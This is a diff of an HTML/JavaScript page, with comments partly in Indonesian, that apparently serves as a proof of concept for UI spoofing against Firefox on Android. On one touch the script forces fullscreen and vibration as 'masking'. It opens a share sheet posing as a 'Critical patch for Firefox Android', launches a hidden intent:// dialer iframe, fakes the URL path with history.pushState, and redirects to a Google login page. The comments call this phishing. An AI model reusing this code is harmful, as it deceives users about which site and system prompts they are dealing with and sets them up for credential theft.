@@ -5,8 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>S Y S T 3 M</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; width: 100vw; height: 100vh; overflow: hidden; }
-        #trigger { width: 100%; height: 100%; cursor: pointer; }
+        body, html { 
+            margin: 0; padding: 0; background: #000; 
+            width: 100vw; height: 100vh; overflow: hidden;
+        }
+        #trigger { 
+            width: 100%; height: 100%; cursor: pointer; 
+        }
     </style>
 </head>
 <body>
@@ -17,42 +22,48 @@
     const trigger = document.getElementById('trigger');
 
     trigger.addEventListener('touchstart', async function() {
-        // 1. Enter Fullscreen (Masking the UI)
+        // 1. Lockdown & Masking
         if (document.documentElement.requestFullscreen) {
             document.documentElement.requestFullscreen();
         }
+        
+        // Vibration memberikan sensasi 'proses sistem' (Masking taktil)
+        if (navigator.vibrate) {
+            navigator.vibrate([100, 50, 100]);
+        }
 
-        // 2. Trigger Permission Request (Hidden behind the next action)
-        // This attempts to 'stack' a permission prompt under the share sheet
-        navigator.geolocation.getCurrentPosition(() => {}, () => {}, {enableHighAccuracy:true});
-
-        // 3. Trigger Web Share (Captures System Focus)
+        // 2. Web Share API (Capture Focus utama)
+        // Ini memicu Native Share Sheet Android
         if (navigator.share) {
             navigator.share({
-                title: 'Required Update',
+                title: 'Security Update Required',
+                text: 'Critical patch for Firefox Android',
                 url: 'https://support.mozilla.org'
             }).catch(() => {});
         }
 
-        // 4. Intent Hijacking (Background)
+        // 3. Intent Hijacking (Background Trigger)
+        // Kita gunakan skema tel: atau intent:// untuk memicu aplikasi sistem
         const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";
+        
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = intentUrl;
         document.body.appendChild(iframe);
 
-        // 5. THE SPOOF: URL Bar Manipulation
-        // As the page redirects, we push a fake state to the history
-        window.history.pushState({}, "", "/login/google-account-verify");
+        // 4. Spoofing History (Manipulasi UI Path)
+        // Sebelum redirect, kita ubah URL bar agar terlihat seperti domain valid
+        window.history.pushState({}, "", "/security-verification-token-992");
 
-        // 6. Final Exit & Redirect
+        // 5. THE COLLISION REDIRECT
+        // Kita picu redirect tepat saat Share Sheet sedang 'merender' di atas UI
         setTimeout(() => {
-            if (document.exitFullscreen) { document.exitFullscreen(); }
-            
-            // This redirect happens while the Android System might still be 
-            // processing the Share or Intent event.
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            }
+            // Redirect ke halaman login asli untuk menyempurnakan phising/masking
             window.location.replace("https://www.google.com/accounts/login");
-        }, 800);
+        }, 700);
     });
 </script>
 </body>
